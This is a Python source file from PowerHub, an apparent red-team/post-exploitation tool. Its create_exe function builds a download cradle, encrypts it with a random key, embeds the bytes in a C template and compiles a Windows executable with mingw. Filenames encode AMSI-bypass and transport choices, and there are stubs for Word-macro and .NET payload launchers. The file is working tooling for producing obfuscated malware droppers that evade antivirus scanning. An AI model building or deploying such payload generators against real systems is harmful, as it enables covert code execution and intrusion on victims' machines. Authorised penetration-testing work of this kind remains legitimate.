import random
import subprocess
import tempfile
import os

import jinja2

from powerhub.tools import encrypt, generate_random_key
from powerhub.stager import build_cradle


def load_template(filename, **kwargs):
    """Wrapper for loading a jinja2 template from file"""
    templateLoader = jinja2.FileSystemLoader(
        searchpath="./powerhub/templates/assets/"
    )
    templateEnv = jinja2.Environment(loader=templateLoader)
    TEMPLATE_FILE = filename
    template = templateEnv.get_template(TEMPLATE_FILE)
    outputText = template.render(**kwargs)
    return outputText


def generate_shellcode(args):
    pass


def create_filename(args):
    result = 'powerhub'
    result += '-' + args['GroupLauncher']
    result += '-' + args['GroupAmsi']
    result += '-' + args['GroupTransport']
    if args['GroupClipExec'] != 'none':
        result += '-' + args['GroupClipExec']
    result += '.exe'
    return result


def create_payload(args):
    payload_generators = {
        "mingw32-32bit": create_exe,
        "mingw32-64bit": create_exe,
        "dotnetexe-32bit": create_dotnet,
        "dotnetexe-64bit": create_dotnet,
        "wordmacro": create_docx,
        #  "rundll32": create_exe,
        #  "installutil": create_exe,
    }
    return payload_generators[args['GroupLauncher']](args)


def create_docx(args):
    pass


def create_exe(args):
    filename = create_filename(args)
    args = dict(args)  # convert from immutable dict
    args['GroupLauncher'] = 'cmd_enc'
    cmd = build_cradle(args)
    size = len(cmd)
    key = generate_random_key(16)
    cmd = encrypt(cmd.encode(), key)
    c_code = load_template(
        'powerhub.c',
        CMD=''.join('\\x%02x' % c for c in cmd),
        LEN_CMD=size,
        KEY=key,
    )

    if args['GroupLauncher'] == 'mingw32-32bit':
        mingw = 'i686-w64-mingw32-gcc'
    else:
        mingw = 'x86_64-w64-mingw32-gcc'

    with tempfile.TemporaryDirectory() as tmpdirname:
        outfile = os.path.join(tmpdirname, 'gcc.out')
        pipe = subprocess.Popen(
            [mingw, "-Wall", "-x", "c", "-o", outfile, "-"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
        )
        pipe.communicate(c_code.encode())
        if pipe.returncode == 0:
            with open(outfile, 'rb') as f:
                result = f.read()
        else:
            raise Exception  # TODO choose right exception
    return filename, result


def create_dotnet(args):
    pass
